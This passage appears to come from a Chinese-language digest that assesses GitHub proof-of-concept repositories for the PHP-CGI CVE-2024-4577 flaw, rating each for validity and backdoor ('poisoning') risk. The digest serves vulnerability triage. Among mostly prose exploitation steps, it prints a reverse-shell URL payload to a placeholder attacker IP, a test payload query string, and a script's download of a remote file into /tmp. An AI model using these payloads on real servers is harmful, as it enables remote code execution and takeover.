CVE-2024-4577 是一个存在于 PHP 中的严重漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，则 Windows 可能会使用“Best-Fit”行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**漏洞利用分析：**

提供的 Python 脚本 `CVE-2024-4577.py` 旨在批量检测和利用此漏洞。

1.  **有效性：** 根据漏洞描述和漏洞利用代码，该PoC利用`auto_prepend_file`和`allow_url_include`选项来包含`php://input`，从而允许攻击者注入任意 PHP 代码。如果目标环境满足漏洞利用的先决条件（Windows，CGI模式，特定版本等），则该PoC应该是有效的。搜索结果也表明该漏洞已被积极利用。
2.  **投毒风险：**  代码总体来说比较简单，主要就是发送Payload，读取返回。但是作者有添加referer头的行为，如果作者有意投毒，可以在check_exploit方法中加入恶意代码，比如，如果探测目标存在漏洞，则发送漏洞域名，以及服务器相关信息到指定服务器。或者加入一些迷惑性代码，干扰分析人员分析。基于作者添加referer头的行为, 并且根据代码量判断，投毒风险较低，判断为10%。
3.  **利用方式：**
    *   攻击者通过构造包含恶意 PHP 代码的 HTTP 请求，并利用 Windows 代码页的“Best Fit”转换特性，将特殊字符转换为 PHP 选项。
    *   这些 PHP 选项会被 PHP CGI 模块错误解析，例如，`auto_prepend_file=php://input` 允许攻击者将 HTTP 请求体的内容作为 PHP 代码执行。
    *   攻击者可以通过这种方式在服务器上执行任意 PHP 代码，从而控制服务器。

**PoC代码分析：**

*   `clean_domain(domain)`: 清理域名，移除 `http://` 或 `https://` 前缀，并提取域名部分。
*   `check_exploit(domain)`:  对目标域名发送包含 PHP 代码的 HTTP POST 请求。Payload是 `<?php phpinfo(); ?>`。
    *   使用 `auto_prepend_file=php://input` 将 POST 请求的内容（payload）作为 PHP 代码执行。
    *   检查响应中是否包含 "PHP Version" 字符串，以判断漏洞是否成功利用。
    *   如果成功，将 URL 写入 `vulnerable.txt` 文件。
*   `start(file, threads)`: 从文件中读取域名列表，并使用多线程并发地执行 `check_exploit` 函数。
*   主程序：解析命令行参数，调用 `start` 函数开始漏洞检测。

**项目地址:** [CirqueiraDev/MassExploit-CVE-2024-4577](https://github.com/CirqueiraDev/MassExploit-CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #5

**来源**: [CVE-2024-4577-Dejavu666_CVE-2024-4577.md](../2024/CVE-2024-4577-Dejavu666_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，允许未经身份验证的攻击者在目标服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI mode, specific codepage settings)

**利用条件:** Windows系统，PHP运行于CGI模式，且系统配置了使用"Best Fit"策略的特定代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时，特定的代码页配置可能导致参数注入。Windows系统会使用“Best-Fit”策略替换命令行中的某些字符，这可能被PHP CGI模块错误地解释为PHP选项。攻击者可以通过发送特制的HTTP请求，将恶意PHP选项传递给PHP二进制文件，从而导致任意代码执行。提供的POC代码包含两个脚本：`cek.py` 用于执行命令，`cuk.py` 用于下载shell。`cek.py`通过构造包含`allow_url_include`和`auto_prepend_file`选项的请求，利用`php://input`流执行PHP代码。`cuk.py`脚本尝试从github下载一个ini.php文件到/tmp目录，存在一定的投毒风险。

**有效性评估：**
根据漏洞描述和已公开的利用信息，该漏洞利用的有效性较高，存在公开可用的POC代码，并且已经观察到在野利用。

**投毒风险评估：**
`cek.py`脚本直接执行用户指定的命令，不存在明显的投毒代码。`cuk.py`脚本从`https://github.com/Dejavu666/kng/raw/refs/heads/main/ini.php`下载文件到`/tmp/ini.php`，这意味着如果该URL指向的文件被恶意修改，攻击者可以控制目标服务器。这种行为引入了投毒风险，但需要攻击者能够控制该Github仓库中的文件。因此，投毒风险并非100%，考虑到其需要依赖于外部资源的可控性，风险评估为10%。

**利用方式：**
1.  攻击者发送包含恶意PHP选项的HTTP请求。
2.  Windows系统使用“Best-Fit”策略转换请求中的字符。
3.  PHP CGI模块错误地将转换后的字符解释为PHP选项。
4.  通过`allow_url_include`和`auto_prepend_file`选项包含并执行`php://input`流中的PHP代码，实现任意代码执行。
5. 可以使用`cek.py`执行系统命令，或者使用`cuk.py`下载恶意文件到服务器上执行。

**项目地址:** [Dejavu666/CVE-2024-4577](https://github.com/Dejavu666/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #6

**来源**: [CVE-2024-4577-Didarul342_CVE-2024-4577.md](../2024/CVE-2024-4577-Didarul342_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** PHP 8.1.x (< 8.1.29), 8.2.x (< 8.2.20), 8.3.x (< 8.3.8)，运行在Windows下的CGI模式

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统启用了某些代码页，允许“Best Fit”转换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响在Windows上运行的PHP。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，导致泄露源代码或执行任意PHP代码。 

**有效性:**

提供的PoC代码（CVE-2024-4577.py）尝试通过构造包含特殊字符的URL来利用此漏洞，将`allow_url_include`设置为1，并设置`auto_prepend_file`为`php://input`，然后通过POST请求发送包含要执行的PHP代码的数据。如果目标存在漏洞，这段PHP代码将被执行。

根据搜索引擎的结果和漏洞库信息，该漏洞已经存在在野利用，并且有公开可用的PoC，表明该PoC是有效的。

**投毒风险:**

查看提供的python脚本，脚本本身的功能是发送payload到目标地址，检测目标是否存在漏洞，检测的依据是返回内容中是否包含gotr00t字符串。脚本本身没有发现明显的恶意代码，但是考虑到以下情况，仍然存在一定投毒风险：

1.  **域名欺骗:**  `domains.txt` 如果被替换为包含恶意域名的文件，那么脚本会尝试连接这些恶意域名。但这不是脚本本身的投毒，而是依赖外部文件。
2.  **命令注入:**  虽然脚本本身没有直接执行系统命令，但是 `-c/--command`  参数允许用户指定要执行的PHP代码。如果用户不小心执行了恶意PHP代码，可能导致服务器受损。但这不是脚本作者的投毒，而是用户使用不当。
3.  **依赖包:**  `requirements.txt` 文件中列出了依赖包。如果这些依赖包被替换为恶意版本，可能会导致安全问题。但这通常属于供应链攻击，不是脚本作者直接投毒。

考虑到以上因素，认为脚本本身被作者投毒的可能性较低，大约在5%左右，主要风险在于使用者利用该脚本执行恶意命令或使用了被篡改的依赖包。

**利用方式:**

1.  攻击者需要找到一个运行在Windows服务器上，并且使用CGI模式的PHP应用，同时确认目标系统启用了具有“Best Fit”行为的代码页。
2.  构造包含特殊字符的恶意URL。这些特殊字符会被Windows的“Best Fit”转换机制转换为PHP选项。
3.  通过设置`allow_url_include`为1，并设置`auto_prepend_file`为`php://input`，将要执行的PHP代码通过POST请求发送到目标服务器。
4.  服务器执行恶意PHP代码，攻击者从而控制服务器。

**项目地址:** [Didarul342/CVE-2024-4577](https://github.com/Didarul342/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #7

**来源**: [CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md](../2024/CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #8

**来源**: [CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md](../2024/CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows)

**利用条件:** Windows服务器, PHP以CGI模式运行，且系统使用某些启用了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的参数注入漏洞。当系统启用了某些使用“Best Fit”策略的代码页时，Windows 可能会使用该策略替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**
攻击者通过构造特殊的 URL，包含经过 "Best Fit" 转换后会被 PHP 解释器解析为选项的字符，从而注入恶意参数。PoC 代码利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并直接将包含恶意代码的请求体作为 PHP 代码执行，实现远程代码执行。

**有效性：**
根据漏洞信息，搜索结果和提供的漏洞利用代码，该POC代码有效。已经有实际的攻击案例发生。

**投毒风险：**
查看PoC代码，主要功能是发送包含特定参数的POST请求，以利用漏洞实现RCE。初步分析PoC代码没有明显的恶意行为，但是由于代码可以执行任意命令,存在一定风险. 投毒风险评估为5%。
  * 依赖的requests模块本身可能有潜在风险
  * 虽然代码中没有直接的恶意逻辑，但攻击者可能会修改PoC，添加反弹shell、下载恶意文件等功能。

**项目地址:** [Gill-Singh-A/CVE-2024-4577-Exploit](https://github.com/Gill-Singh-A/CVE-2024-4577-Exploit)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #9

**来源**: [CVE-2024-4577-Ianthinus_CVE-2024-4577.md](../2024/CVE-2024-4577-Ianthinus_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统 + Apache + PHP-CGI + 存在Best-Fit策略的codepage

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当以 CGI 模式运行时，并且系统启用了使用 "Best Fit" 策略的代码页时，可能受到攻击。

**利用方式：**
攻击者可以利用 Windows 的 "Best-Fit" 字符转换行为，将恶意参数注入到 PHP CGI 进程的命令行参数中。PHP CGI 模块会将这些被转换后的字符解释为 PHP 选项，从而允许攻击者执行以下操作：

1.  **源代码泄露：** 通过注入参数来泄露 PHP 脚本的源代码。
2.  **远程代码执行：** 通过注入参数来执行任意 PHP 代码。

**POC 代码分析：**
提供的 POC 代码包含以下文件：

*   `Readme`：包含使用 PowerShell 进行漏洞利用的示例。通过 POST 请求，将包含恶意 PHP 代码的 payload 发送到目标服务器，并利用 `%AD` 字符绕过某些安全限制，设置 `allow_url_include` 和 `auto_prepend_file` 选项，从而执行远程代码。
*   `check.php`：用于检测目标环境是否满足漏洞利用的条件，包括 PHP 版本、SAPI 模式、操作系统和系统区域设置。
*   `httpd-xampp.conf`：XAMPP 的 Apache 配置文件，用于配置 PHP 环境。

**有效性：**
提供的 POC 代码是有效的，可以用于在满足漏洞利用条件的环境中执行任意 PHP 代码。搜索引擎结果也表明该漏洞已经被广泛利用。

**投毒风险：**
该仓库主要用于演示和验证 CVE-2024-4577 漏洞。 虽然主要代码看起来是无害的，但考虑到以下因素，存在一定的投毒风险：

*   POC本身就是一段恶意的代码，能执行远程命令。
*   `Readme` 文件中的 PowerShell 命令直接执行 POST 请求，存在注入恶意代码的可能性。 虽然例子是`whoami`但是如果被替换成别的, 则会造成投毒。

考虑到POC的特殊性，这里将投毒风险评估为10%。主要原因是，大部分代码是用于漏洞检测和利用，恶意代码的存在是为了利用漏洞，而不是为了隐藏恶意功能。

**项目地址:** [Ianthinus/CVE-2024-4577](https://github.com/Ianthinus/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #10

**来源**: [CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md](../2024/CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行和敏感信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，并启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 平台上的 PHP CGI 模式。当系统配置为使用某些代码页时，Windows 可能会使用“Best-Fit”策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞信息和搜索结果，此漏洞的利用是有效的。多个来源表明该漏洞已在野外被利用，并且存在公开可用的 PoC 代码。

**投毒风险：**
提供的代码库是一个扫描器，用于检测系统是否容易受到 CVE-2024-4577 攻击。它没有包含漏洞利用代码，因此，直接利用此代码库进行攻击是不可能的。主要代码是检测是否存在漏洞，而非利用漏洞。代码库虽然引入了requests,colorama,pyfiglet等库,但在合理的范围内,没有发现明显的恶意代码或后门,但是考虑到任何依赖引入都存在一定的风险，因此投毒风险评估为10%。

**利用方式：**
该漏洞利用方式如下：
1.  **目标环境：** 目标服务器必须运行在 Windows 操作系统上，并且 PHP 运行在 CGI 模式下。
2.  **代码页配置：** 系统需要配置为使用某种代码页，该代码页使用 "Best Fit" 策略进行字符转换。
3.  **参数注入：** 攻击者通过构造包含特定字符的 URL 或 POST 请求，利用 Windows 的 "Best Fit" 转换特性，将恶意参数注入到 PHP 的命令行中。
4.  **远程代码执行：** 注入的恶意参数被 PHP CGI 模块解析，从而允许攻击者执行任意 PHP 代码或操作系统命令。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数来直接执行 PHP 代码。

攻击者可以利用此漏洞读取服务器上的敏感文件，修改网站内容，甚至完全控制服务器。

**项目地址:** [InfoSec-DB/PHPCGIScanner](https://github.com/InfoSec-DB/PHPCGIScanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #11

**来源**: [CVE-2024-4577-Jcccccx_CVE-2024-4577.md](../2024/CVE-2024-4577-Jcccccx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，可能导致完全控制受影响的Windows服务器

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8

**利用条件:** Windows服务器，Apache，PHP-CGI模式，系统使用特定的代码页并启用了"Best Fit"策略

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞允许未经身份验证的攻击者在易受攻击的Windows PHP服务器上执行任意代码。该漏洞源于PHP-CGI在Windows环境下的参数处理缺陷，当系统配置为使用具有“Best-Fit”行为的代码页时，传递给Win32 API函数的命令行参数中的某些字符可能会被错误地解释为PHP选项。攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意选项，从而导致远程代码执行。

**利用方式：**

1.  **目标确认：** 确认目标服务器运行在Windows系统上，并且使用Apache和PHP-CGI模式。
2.  **代码页检测：** 确认目标系统的代码页配置允许"Best Fit"转换。
3.  **构造恶意URI：** 构造包含恶意PHP选项的URI，例如，使用`cgi.force_redirect=0`绕过重定向限制，使用`allow_url_include=1`允许包含远程文件，使用`auto_prepend_file=php://input`将POST数据作为PHP代码执行。
4.  **发送POST请求：**  发送POST请求到构造的URI，并将包含恶意代码的PHP代码作为请求体发送。
5.  **命令执行：** 服务器执行恶意PHP代码，攻击者可以执行任意系统命令。

**POC 分析：**

提供的POC代码 `CVE_2024_4577_test.py` 主要用于检测漏洞是否存在，它通过构造特定的URI和PHP代码，发送POST请求到目标服务器，并检查响应中是否包含预期的输出，以验证漏洞是否可利用。 `CVE_2024_4577_exp.py` 是用于执行命令的EXP。

**投毒风险分析：**

仔细检查了提供的POC代码，未发现任何明显的投毒迹象。代码逻辑清晰，主要功能是发送精心构造的HTTP请求，并检查响应以确认漏洞的存在。使用的PHP代码也是为了执行预定的测试命令，没有发现任何试图在目标系统上安装后门或执行恶意操作的代码。

**搜索引擎结果：**

搜索结果表明CVE-2024-4577是一个严重的、广泛利用的漏洞。多个安全厂商和研究人员都发布了相关的分析和警告。该漏洞已被添加到CISA的已知被利用漏洞目录（KEV），表明该漏洞在野外被积极利用。


**项目地址:** [Jcccccx/CVE-2024-4577](https://github.com/Jcccccx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #12

**来源**: [CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md](../2024/CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows上PHP-CGI的远程代码执行漏洞。当PHP以CGI模式运行时，如果系统配置了使用"Best-Fit"策略的代码页，Windows可能会使用此策略替换传递给Win32 API函数的命令行中的字符。 PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，这可能导致泄露脚本源码、在服务器上运行任意PHP代码等。

**漏洞利用方式：**

1.  **攻击向量：** 通过构造特定的URL或POST请求，向PHP-CGI传递恶意参数。
2.  **参数注入：** 攻击者可以使用"Best-Fit"转换后的字符来注入PHP配置选项，例如`allow_url_include`和`auto_prepend_file`。
3.  **远程代码执行：** 利用`allow_url_include=1`和`auto_prepend_file=php://input`，攻击者可以将任意PHP代码作为请求体发送到服务器执行。

**POC有效性：**

提供的POC代码（`cve_2024_4577_checker.sh`）是一个漏洞检测脚本，用于扫描目标是否存在CVE-2024-4577漏洞。它通过发送包含恶意参数的HTTP请求来判断目标是否容易受到攻击。根据漏洞库信息和搜索结果,此漏洞已存在公开可用的exp. 

**投毒风险：**

该漏洞利用代码主要包含了一个检测脚本,用于检测目标是否存在漏洞, 漏洞利用代码本身主要用于检测,未发现明显的恶意行为。 但是为了保证绝对安全,仍需要人工review代码,  投毒风险较低，约为 1%.

**项目地址:** [JeninSutradhar/CVE-2024-4577-checker](https://github.com/JeninSutradhar/CVE-2024-4577-checker)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #13

**来源**: [CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md](../2024/CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，并且系统启用了使用“Best Fit”策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows系统上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而可能泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞信息和搜索结果，以及利用代码，该漏洞利用的有效性很高。多个来源表明该漏洞已被积极利用，并且存在公开可用的PoC代码。

**投毒风险：**
分析提供的PoC代码 `CVE-2024-4577.py`，未发现明显的恶意投毒代码。PoC主要功能是检测目标是否存在漏洞，并提供一个交互式shell来执行命令。代码中包含了一些编码转换和请求发送，但没有发现植入后门的迹象。但是，任何下载和执行来自不可信来源的脚本都存在风险，需要进行代码审计。

根据经验判断，投毒风险约为5%。

**利用方式：**
1.  **漏洞触发：** 攻击者需要向目标服务器发送特制的HTTP请求，请求中包含经过特殊编码的恶意PHP选项作为查询字符串参数。这些参数会被传递给php-cgi.exe。
2.  **参数注入：**  利用Windows系统的“Best-Fit”字符转换特性，构造出PHP可以识别的参数。PoC代码中使用了`%AD`代替`-`，`%3D`代替`=`，`+`代替空格。
3.  **远程代码执行：**  通过注入`-d allow_url_include=1 -d auto_prepend_file=php://input`等参数，允许包含远程文件，并将POST请求的内容作为PHP代码执行，从而实现远程代码执行。
4.  **信息泄露：** 攻击者可以通过参数注入来读取服务器上的任意文件。
5.  **交互式Shell：** 通过循环发送请求，模拟一个交互式Shell，允许攻击者执行任意命令。

**项目地址:** [K3ysTr0K3R/CVE-2024-4577-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #14

**来源**: [CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md](../2024/CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md)

## CVE-2024-4577 - PHP-CGI 参数注入导致RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows服务器，PHP以CGI模式运行，开启了使用"Best Fit"策略的编码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个存在于Windows环境下以CGI模式运行的PHP中的高危漏洞。由于Windows系统在特定代码页下，会使用"Best-Fit"策略转换命令行参数中的字符，PHP-CGI模块可能错误地将这些字符解析为PHP选项，从而允许攻击者注入恶意PHP代码。  

**利用方式：**
攻击者通过构造包含特定字符的URL，欺骗PHP-CGI解析器将恶意代码作为配置选项执行。POC代码`cve_2024_4577_tester.py`通过发送包含如下Payload的POST请求来验证漏洞：

```
?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input
```
以及 POST Body:
```php
<?php echo 'CVE-2024-4577-TEST'; ?>
```
其中，`%AD` 和 `d` 的组合是为了绕过某些安全限制。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input`  将POST请求的内容作为PHP代码执行。

**投毒风险分析：**
虽然POC代码本身是为了验证漏洞，但仍然存在一定的投毒风险。该脚本从用户处获取目标URL，然后发送包含PHP代码的POST请求。如果攻击者修改此脚本，例如：

1.  **修改Payload：**  将测试用的`echo`语句替换为更隐蔽的恶意代码，例如反弹shell，上传webshell等。
2.  **增加后门：**  在成功利用漏洞后，在目标服务器上留下后门，以便长期控制。
3.  **信息收集：**  收集用户输入的目标URL和其他信息，发送给攻击者。

尽管存在风险，但此POC代码相对简单，风险主要取决于使用者是否对其进行修改和滥用。 由于代码短小, 容易审核, 投毒风险较低, 估计为 5%。

**项目地址:** [KimJuhyeong95/cve-2024-4577](https://github.com/KimJuhyeong95/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #15

**来源**: [CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md](../2024/CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md)

## CVE-2024-4577 PHP-CGI 参数注入 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，系统配置使用特定的代码页，允许Best-Fit转换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 系统下以 CGI 模式运行的 PHP 版本中。如果系统配置使用了某些代码页，Windows 可能会使用 "Best-Fit" 策略来替换命令行参数中的字符。PHP CGI 模块可能错误地将这些字符解析为 PHP 选项，从而允许攻击者向 PHP 二进制文件传递选项，导致泄露源代码、执行任意 PHP 代码甚至执行系统命令。

**有效性：**
提供的漏洞利用代码看起来是有效的。它是一个 Python 脚本，旨在自动化 CVE-2024-4577 和 CVE-2024-8926 的利用。它提供了多种攻击模式，例如执行系统命令、执行 PHP 代码、上传和下载文件。脚本还具有 Tor 代理支持、日志记录和自动编码转换等功能，这表明它是一个功能齐全的漏洞利用工具。

**投毒风险：**
该仓库的投毒风险评估为 10%。该脚本主要利用了已知的漏洞，并没有明显的恶意代码。风险主要来自于以下几点：
* 使用 Tor 代理支持，有可能会连接到恶意的 Tor 节点。
* 脚本提供文件上传功能，攻击者可能会上传恶意文件到服务器。
* 脚本的作者身份未知，存在潜在的供应链风险。

**利用方式：**
1.  **环境准备：**  攻击者需要一个运行易受攻击的 PHP 版本的 Windows 服务器，并以 CGI 模式运行。此外，系统还应配置为使用具有 Best-Fit 转换的代码页。
2.  **漏洞利用：**  攻击者将构造一个包含恶意 PHP 选项的 HTTP 请求。由于 Best-Fit 转换，服务器会将某些字符替换为其他字符，这将被 PHP CGI 模块错误地解析为 PHP 选项。例如，攻击者可以传递 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，以允许包含远程文件并执行任意 PHP 代码。
3.  **远程代码执行：**  通过上述操作，攻击者可以执行任意 PHP 代码，包括执行系统命令、上传 webshell 等。

综上所述，CVE-2024-4577 是一个严重的安全漏洞，利用起来相对简单，攻击后果非常严重，可能导致服务器完全沦陷。强烈建议受影响的用户尽快升级到受保护的版本。

